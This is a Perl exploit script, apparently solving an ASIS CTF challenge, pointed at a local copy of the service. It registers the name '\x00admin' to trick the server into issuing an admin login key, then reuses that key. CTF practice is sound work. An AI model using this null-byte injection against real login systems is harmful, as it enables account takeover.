#!/usr/bin/perl

use strict;
use IO::Socket::INET;


my $line;
my $sock;
my $key;

sock_connect();

send_sock("1\n");
send_sock("\x00admin\n");

$key = recv_until("login is:");
($key) = $key =~ m/login is: (.+)/;

sock_connect();
send_sock("2\n");
send_sock("$key\n");

recv_until();

sleep 1;
sock_connect();
send_sock("3\n");
send_sock("$key\n");
recv_until();

sub recv_until {
    my $regex = shift;

    while(my $line = <$sock>) {
	print $line;
	return $line if($regex && index($line, $regex) != -1);
    }
    return "";
}

sub send_sock {
    my $s = shift;
    print $sock $s;
    $sock->flush;
    sleep 1;
}

sub sock_connect {
    my $HOST = 'asis-ctf.ir';
    my $PORT = 12439;

    $HOST = '127.0.0.1'; $PORT = 35565;
    $sock = IO::Socket::INET->new(PeerAddr => $HOST,
				  PeerPort => $PORT,
				  Proto => 'tcp') || die $@;
}
